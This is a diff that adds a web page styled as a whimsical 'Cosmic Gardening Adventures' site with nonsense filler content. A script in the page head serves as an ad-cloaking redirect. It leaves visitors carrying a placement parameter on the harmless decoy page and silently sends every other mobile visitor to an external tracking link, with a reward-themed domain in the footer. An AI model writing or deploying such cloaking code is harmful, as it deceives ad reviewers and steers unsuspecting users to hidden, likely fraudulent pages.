@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Gardening Adventures</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            grid-column: 1 / 3;
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            grid-column: 3 / 4;
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000000;
+        }
+        .plant {
+            width: 100px;
+            height: 100px;
+            background-color: #00ff00;
+            margin: 10px;
+            display: inline-block;
+            border-radius: 50%;
+            animation: grow 5s infinite alternate;
+        }
+        @keyframes grow {
+            from { transform: scale(1); }
+            to { transform: scale(1.5); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Gardening Adventures</h1>
+        </header>
+        <main>
+            <h2>Welcome to Our Intergalactic Garden</h2>
+            <p>Explore the wonders of space botany and grow your own alien plants!</p>
+            <div class="plant"></div>
+            <div class="plant"></div>
+            <div class="plant"></div>
+        </main>
+        <aside>
+            <h3>Space Plant Care Tips</h3>
+            <ul>
+                <li>Water with moon juice daily</li>
+                <li>Expose to at least 3 different star lights</li>
+                <li>Sing to your plants in Martian</li>
+            </ul>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Cosmic Gardening Adventures | <a href="https://tokreward.com/privacy.html" style="color: #ffffff;">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
